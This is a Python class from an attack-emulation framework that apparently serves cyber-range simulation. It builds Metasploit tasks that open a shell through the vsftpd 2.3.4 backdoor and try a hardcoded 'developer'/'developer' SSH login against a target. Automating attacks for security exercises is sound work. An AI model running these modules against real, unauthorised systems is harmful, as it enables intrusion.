from .cryton_action import CrytonAction
from cyst.api.logic.metadata import Metadata


class ExploitServer(CrytonAction):
    def __init__(self, message_id: int, metadata: Metadata, target: str, service: str):
        super().__init__(message_id, metadata)

        if service == "ftp":
            module_arguments = {
                "module_type": "auxiliary",
                "module": "unix/ftp/vsftpd_234_backdoor",
                "module_options": {
                    "RHOSTS": target
                },
                "payload": "cmd/unix/interact",
                "module_retries": 3
            }
        elif service == "ssh":
            module_arguments = {
                "module_type": "auxiliary",
                "module": "scanner/ssh/ssh_login",
                "module_options": {
                    "RHOSTS": target,
                    "USERNAME": "developer",
                    "PASSWORD": "developer"
                },
                "module_retries": 3
            }
        else:
            raise RuntimeError(f"Unsupported service {service}.")

        self._template = {
            "name": f"exploit-server-{message_id}",
            "step_type": "worker/execute",
            "is_init": True,
            "arguments": {
                "module": "mod_msf",
                "module_arguments": module_arguments
            }
        }
